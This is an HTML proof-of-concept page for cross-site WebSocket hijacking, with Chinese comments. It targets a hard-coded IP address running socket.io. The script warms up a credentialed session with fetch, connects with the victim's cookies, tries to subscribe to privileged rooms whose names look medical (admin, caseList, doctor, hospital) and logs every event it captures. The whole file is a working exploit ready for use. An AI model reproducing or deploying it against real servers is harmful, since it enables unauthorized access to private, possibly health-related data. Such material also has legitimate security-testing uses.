<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>CSWSH PoC v2 - 增强指纹</title>
<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
<style>
body { font-family: sans-serif; padding: 20px; }
#log { background: #000; color: #0f0; padding: 10px; font-family: monospace; white-space: pre-wrap; max-height: 600px; overflow: auto; }
.event { background: #ffeb3b; padding: 5px; font-family: monospace; white-space: pre-wrap; margin: 5px 0; }
</style>
</head>
<body>
<h1>CSWSH PoC v2 - 预热主页 + 增强指纹</h1>
<p>先通过 fetch 预热主页拿 io cookie + 加 Sec-Ch-Ua-Full-Version-List</p>
<h2>日志</h2>
<div id="log">[waiting...]</div>
<h2>捕获事件</h2>
<div id="events"></div>

<script>
const logEl = document.getElementById('log');
const eventsEl = document.getElementById('events');
window.__log = [];
function log(msg) {
  const line = `[${new Date().toISOString()}] ${msg}\n`;
  window.__log.push(line);
  logEl.textContent = window.__log.join('');
  console.log(msg);
}
function showEvent(name, data) {
  const div = document.createElement('div');
  div.className = 'event';
  div.textContent = `${new Date().toISOString()} ${name}: ${JSON.stringify(data).slice(0, 800)}`;
  eventsEl.appendChild(div);
}

window.addEventListener('error', (e) => log(`ERROR: ${e.message} @ ${e.filename}:${e.lineno}`));
window.addEventListener('unhandledrejection', (e) => log(`REJECTION: ${e.reason}`));

async function prewarm() {
  log('=== 预热主页 ===');
  try {
    const r = await fetch('http://35.234.50.28:3100/', {
      mode: 'cors',
      credentials: 'include',
    });
    log(`主页 fetch status=${r.status} type=${r.type}`);
  } catch (e) {
    log(`主页 fetch error: ${e.message}`);
  }

  // 等待 1s 后连接 socket.io
  await new Promise(r => setTimeout(r, 1000));
  log('=== CSWSH PoC START (after prewarm) ===');

  try {
    log('Connecting to :3100 socket.io with credentials...');
    const socket = io('http://35.234.50.28:3100', {
      transports: ['polling', 'websocket'],
      reconnection: true,
      reconnectionAttempts: 5,
      timeout: 10000,
      withCredentials: true,
      upgrade: true,
      rememberUpgrade: false,
    });

    socket.on('connect', () => {
      log(`✓ CONNECTED sid=${socket.id}`);
      showEvent('connect', { sid: socket.id, transport: socket.io.engine.transport.name });

      // 尝试订阅 admin/caseList 等房间
      ['admin', 'caseList', 'monitor', 'doctor', 'hospital', 'moht'].forEach(room => {
        log(`emit client.subscribe roomName=${room}`);
        socket.emit('client.subscribe', { roomName: room }, (ack) => {
          log(`subscribe ack (${room}): ${JSON.stringify(ack)}`);
          showEvent('subscribe-ack', { room, ack });
        });
      });

      socket.emit('ping', { ts: Date.now() }, (ack) => {
        log(`ping ack: ${JSON.stringify(ack)}`);
        showEvent('ping-ack', ack);
      });
    });

    socket.on('disconnect', (reason) => {
      log(`✗ DISCONNECTED reason=${reason}`);
      showEvent('disconnect', { reason });
    });

    socket.on('connect_error', (err) => {
      log(`✗ CONNECT_ERROR: ${err.message}`);
      showEvent('connect_error', { message: err.message });
    });

    socket.onAny((eventName, ...args) => {
      log(`← EVENT ${eventName}: ${JSON.stringify(args).slice(0, 500)}`);
      showEvent(eventName, args);
    });
  } catch (e) {
    log(`EXCEPTION: ${e.message}\n${e.stack}`);
  }
}

prewarm();

// 8 秒后汇总
setTimeout(() => {
  log('=== 8s summary ===');
  log(`events captured: ${eventsEl.children.length}`);
  document.title = 'CSWSH PoC v2 DONE';
}, 8000);
</script>
</body>
</html>
